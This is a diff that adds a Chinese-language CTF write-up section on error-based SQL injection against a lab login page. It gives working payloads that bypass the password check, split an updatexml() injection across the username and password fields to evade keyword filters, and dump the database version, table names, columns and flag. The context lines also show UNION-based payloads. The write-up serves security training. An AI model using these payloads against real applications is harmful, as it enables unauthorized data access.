@@ -136,5 +136,84 @@ id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.ta
 	ID: 1'/**/union/**/select/**/flag/**/from/**/flag/**/where/**/'1'='1<br>name: baloteli</pre><pre>ID: 1'/**/union/**/select/**/flag/**/from/**/flag/**/where/**/'1'='1<br>name: flag{Y0u_@r3_5O_dAmn_90Od}
 
 
+# 加了料的报错注入
+
+根据提示，本题修改HTTP数据传输方式为`POST`，传输数据为 `username=1&password=1` 。
+
+提示
+> Login failed
+> <!-- $sql="select * from users where username='$username' and password='$password'";  -->
+
+绕过password：
+```
+username=1'&password=or'1
+```
+构造的SQL语句为 
+
+> select * from users where username='1'`' and password='`or'1'
+
+得到的显示结果为
+> You are our member, welcome to enter
+
+没有给出回显字段，可以通过基于错误回显的SQL注入。
+
+先分别查看 `username` 和 `password` 过滤的字符串
+
+`username`：
+```
+--+ # = - mid like union order limit substr rand ascii sleep ( ) 
+```
+
+`password`： 
+```
+--+ # = - mid like union order limit substr rand ascii sleep extractvalue updatexml
+```
+
+## HTTP分割注入（HTTP Parameter Fragment）
+
+基于错误回显的注入为
+`updatexml(1,concat(0x7e,version(),0x7e),1)`，但是这条语句不能通过单一的参数传，两个参数过滤的关键字不同，
+可以采用HTTP分割注入：`username` 未过滤 `updatexml` ，而 `password` 未过滤 `()`， 中间的语句通过注释符过滤掉。
+
+```
+username=1' or updatexml/*&password=*/(1,concat(0x7e, (version()),0x7e),1) or '
+```
+得到回显错误：
+> XPATH syntax error: '~5.5.47~'
+
+那么接下来就是顺利成章的爆出数据库、表、字段和数据。
+
+```
+username=1' or updatexml/*&password=*/(1,concat(0x7e,database(),0x7e),1) or '
+```
+> XPATH syntax error: '~error_based_hpf~'
+password过滤了 `=` 和 `like`，那么可以采用 `regexp` 或者 不等号`<>` 来查询。
+```
+username=1' or updatexml/*&password=*/(1,concat(0x7e,select group_concat(table_name) from information_schema.tables where table_schema regexp database(),0x7e),1) or '
+
+```
+上面的用例报错，由于没有在 `select group_concat(table_name) from information_schema.tables where table_schema regexp database()` 外面加括号导致，很费解，加上就好了。
+```
+username=1' or updatexml/*&password=*/(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema regexp database()),0x7e),1) or '
+# 或者
+username=1' or updatexml/*&password=*/(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where !(table_schema<>database())),0x7e),1) or '
+```
+> XPATH syntax error: '~ffll44jj,users~'
+
+```
+username=1' or updatexml/*&password=*/(1,concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name regexp 'ffll44jj'),0x7e),1) or '
+```
+> XPATH syntax error: '~value~'
+
+```
+username=1' or updatexml/*&password=*/(1,concat(0x7e, (select group_concat(value) from ffll44jj),0x7e),1) or '
+```
+> XPATH syntax error: '~flag{err0r_b4sed_sqli_+_hpf}~'
+
+
+[加了料的报错注入(实验吧)](https://www.cnblogs.com/s1ye/p/8284806.html)
+
+# 
+
 # 参考
 - [西普实验吧CTF解题Writeup大全](http://hebin.me/2017/09/01/%E8%A5%BF%E6%99%AE%E5%AE%9E%E9%AA%8C%E5%90%A7ctf%E8%A7%A3%E9%A2%98writeup%E5%A4%A7%E5%85%A8/)
